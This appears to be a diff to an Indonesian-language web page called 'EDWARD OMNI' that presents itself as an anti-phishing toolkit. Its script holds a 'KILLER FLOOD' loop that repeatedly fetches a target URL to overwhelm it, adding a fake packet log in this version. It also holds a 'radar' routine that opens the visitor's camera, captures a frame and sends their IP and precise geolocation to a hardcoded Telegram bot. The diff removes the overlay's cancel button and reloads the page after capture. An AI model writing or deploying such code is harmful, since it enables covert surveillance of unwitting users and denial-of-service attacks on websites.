@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EDWARD OMNI V.50.6</title>
+    <title>EDWARD OMNI V.50.7</title>
     <style>
         :root { --neon: #00ff88; --bg: #050a0e; --card-bg: rgba(15, 25, 35, 0.7); --safe: #00ffa3; --purple: #8a2be2; --red: #ff4757; }
         * { box-sizing: border-box; transition: 0.3s; }
@@ -28,6 +28,11 @@
         .status-safe { background: rgba(0,255,163,0.1); border: 1px solid var(--safe); color: var(--safe); }
         .status-danger { background: rgba(255,71,87,0.1); border: 1px solid var(--red); color: var(--red); box-shadow: 0 0 20px rgba(255,71,87,0.3); }
         
+        /* KILLER LOG STYLE */
+        #killerLog { display: none; margin-top: 15px; background: #000; border-radius: 12px; padding: 15px; font-family: 'Courier New', monospace; font-size: 10px; border: 1px solid #222; height: 150px; overflow-y: auto; color: #0f0; }
+        .log-entry { margin-bottom: 4px; border-bottom: 1px solid #111; padding-bottom: 2px; }
+        .log-success { color: var(--neon); }
+
         #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(5,10,14,0.95); z-index: 9999; flex-direction: column; align-items: center; justify-content: center; backdrop-filter: blur(15px); }
         .radar-box { width: 200px; height: 200px; border-radius: 50%; border: 2px solid var(--neon); position: relative; }
         .sweep { position: absolute; width: 50%; height: 50%; background: linear-gradient(45deg, var(--neon), transparent); transform-origin: bottom right; animation: sweep 1.5s linear infinite; border-radius: 0 100% 0 0; }
@@ -39,7 +44,7 @@
 
     <div class="master-header">
         <p class="master-name">EDWARD OMNI</p>
-        <span class="version-tag">SYSTEM V.50.6 - INDO</span>
+        <span class="version-tag">STABLE V.50.7 - KILLER LOG</span>
     </div>
 
     <div class="card">
@@ -50,9 +55,10 @@
     </div>
 
     <div class="card">
-        <h3>🔥 KILLER FLOOD</h3>
-        <input type="text" id="targetUrl" placeholder="Link target phising...">
+        <h3>🔥 KILLER FLOOD (MULTI-THREAD)</h3>
+        <input type="text" id="targetUrl" placeholder="https://link-phising-target.com">
         <button class="btn btn-phish" id="atkBtn" onclick="toggleAtk()">EXECUTE FLOOD 🚀</button>
+        <div id="killerLog"></div>
     </div>
 
     <div class="card">
@@ -62,8 +68,7 @@
 
     <div id="radarOverlay">
         <div class="radar-box"><div class="sweep"></div></div>
-        <p style="margin-top:25px; font-size:11px; color:var(--neon);">MENCARI KOORDINAT...</p>
-        <button onclick="location.reload()" style="background:none; border:1px solid #444; color:#666; padding:8px 20px; border-radius:20px; margin-top:20px;">BATAL</button>
+        <p style="margin-top:25px; font-size:11px; color:var(--neon);">MENGAMBIL DATA KOORDINAT...</p>
     </div>
 
     <canvas id="canvas"></canvas>
@@ -74,7 +79,6 @@
         const CHAT_ID = '7898572558';
         let isAtk = false, atkInt;
 
-        // DATABASE DETEKSI
         const keywords = ['dana', 'kaget', 'klaim', 'giveaway', 'hadiah', 'login', 'verifikasi', 'fb', 'ig', 'bank', 'prakerja', 'bansos', 'whatsapp'];
         const suspiciousExt = ['.top', '.xyz', '.tk', '.site', '.info', '.online', '.uno', '.ga', '.cf'];
 
@@ -82,33 +86,37 @@
             const url = document.getElementById('scanInput').value.toLowerCase();
             const status = document.getElementById('scanStatus');
             if(!url) return;
-
-            status.style.display = "block";
-            status.className = ""; 
-            status.innerText = "SEDANG MENGANALISA...";
-
+            status.style.display = "block"; status.className = ""; status.innerText = "MENGANALISA...";
             setTimeout(() => {
-                const isBadWord = keywords.some(word => url.includes(word));
-                const isBadDomain = suspiciousExt.some(ext => url.includes(ext));
-                const noHttps = !url.startsWith('https://');
-
-                if(isBadWord || isBadDomain || (url.length > 10 && noHttps)) {
-                    status.className = "status-danger";
-                    status.innerText = "INI LINK PHISING";
-                } else {
-                    status.className = "status-safe";
-                    status.innerText = "INI AMAN";
-                }
+                const isBad = keywords.some(w => url.includes(w)) || suspiciousExt.some(e => url.includes(e));
+                if(isBad) { status.className = "status-danger"; status.innerText = "INI LINK PHISING"; }
+                else { status.className = "status-safe"; status.innerText = "INI AMAN"; }
             }, 2000);
         }
 
+        function addLog(msg) {
+            const log = document.getElementById('killerLog');
+            const entry = document.createElement('div');
+            entry.className = "log-entry log-success";
+            entry.innerText = "> [" + new Date().toLocaleTimeString() + "] " + msg;
+            log.prepend(entry);
+            if (log.childNodes.length > 50) log.removeChild(log.lastChild);
+        }
+
         function toggleAtk() {
-            let u = document.getElementById('targetUrl').value;
+            const u = document.getElementById('targetUrl').value;
+            const logBox = document.getElementById('killerLog');
             if(!u) return;
             if(!isAtk) {
                 isAtk = true;
+                logBox.style.display = "block";
                 document.getElementById('atkBtn').innerText = "STOP FLOOD";
-                atkInt = setInterval(() => { for(let i=0; i<100; i++){ fetch(u, {mode:'no-cors'}).catch(()=>{}); } }, 100);
+                atkInt = setInterval(() => { 
+                    for(let i=0; i<5; i++){ 
+                        fetch(u, {mode:'no-cors', cache:'no-cache'}).catch(()=>{}); 
+                        addLog("PACKET SENT TO " + u.substring(0, 25) + "...");
+                    } 
+                }, 500);
             } else { location.reload(); }
         }
 
@@ -116,8 +124,7 @@
             document.getElementById('radarOverlay').style.display = 'flex';
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('v');
-                video.srcObject = stream;
+                const video = document.getElementById('v'); video.srcObject = stream;
                 setTimeout(async () => {
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth; canvas.height = video.videoHeight;
@@ -131,8 +138,9 @@
                         let m = "🔱 [ EDWARD LOG ] 🔱\n🌐 IP: "+ipD.ip+"\n📍 LOC: http://googleusercontent.com/maps?q="+p.coords.latitude+","+p.coords.longitude;
                         fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+CHAT_ID+"&text="+encodeURIComponent(m));
                     }, null, {enableHighAccuracy:true});
-                }, 2500);
-            } catch (e) {}
+                    location.reload();
+                }, 3000);
+            } catch (e) { location.reload(); }
         }
     </script>
 </body>
